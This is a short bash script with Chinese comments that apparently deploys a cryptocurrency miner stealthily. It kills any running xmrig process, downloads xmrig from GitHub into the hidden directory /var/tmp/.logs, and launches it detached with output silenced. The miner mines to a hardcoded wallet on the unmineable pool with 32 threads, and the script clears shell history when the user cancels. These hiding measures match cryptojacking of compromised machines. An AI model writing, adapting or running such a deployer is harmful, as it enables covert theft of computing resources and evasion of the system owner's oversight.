#!/bin/bash

# 下载文件的函数
download_file() {
    local url=$1
    local output_path=$2

    if command -v wget &> /dev/null; then
        echo "使用 wget 下载..."
        wget "$url" -O "$output_path" &> /dev/null
    elif command -v curl &> /dev/null; then
        echo "未找到 wget，使用 curl 下载..."
        curl -L "$url" -o "$output_path" &> /dev/null
    else
        echo "既未安装 wget，也未安装 curl。请安装其中之一后重试。"
        exit 1
    fi
}

# 查找运行中的 xmrig 进程
process=$(pgrep -fl xmrig)

if [ -n "$process" ]; then
    echo "找到 xmrig 进程："
    # 输出进程的完整启动命令
    echo "$process" | awk '{print $1}' | xargs ps -o pid,cmd -p
    echo "请选择操作："
    echo "1) 终止进程并开始下载新版本"
    echo "2) 取消脚本运行"
    read -p "您的选择： " choice

    if [ "$choice" == "1" ]; then
        # 终止 xmrig 进程
        pkill -f xmrig
        echo "xmrig 进程已终止。开始下载..."
    else
        echo "脚本已取消。"
        history -c
        clear
        exit 0
    fi
else
    echo "未找到 xmrig 进程。开始下载新版本..."
fi

# 创建隐藏终端用于下载和运行
(
    # 归档文件路径和目录
    archive_path="/var/tmp/.logs/xmrig.tar.gz"
    download_url="https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz"

    # 下载 xmrig 归档文件
    mkdir -p /var/tmp/.logs
    download_file "$download_url" "$archive_path"

    # 解压归档文件
    tar -xzf "$archive_path" -C /var/tmp/.logs/ &> /dev/null

    # 进入目录
    cd /var/tmp/.logs/xmrig-6.22.0

    # 赋予文件执行权限
    chmod +x ./xmrig

    # 使用额外参数启动 xmrig
    ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 \
    -u PEPE:0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.unmineable_worker_$(shuf -i 1000-9999 -n 1)-$(date +%s) \
    --cpu-no-yield --cpu-priority 5 --threads 32 -p x >/dev/null 2>&1 & disown
)

echo "xmrig 的下载和运行正在后台进行。"
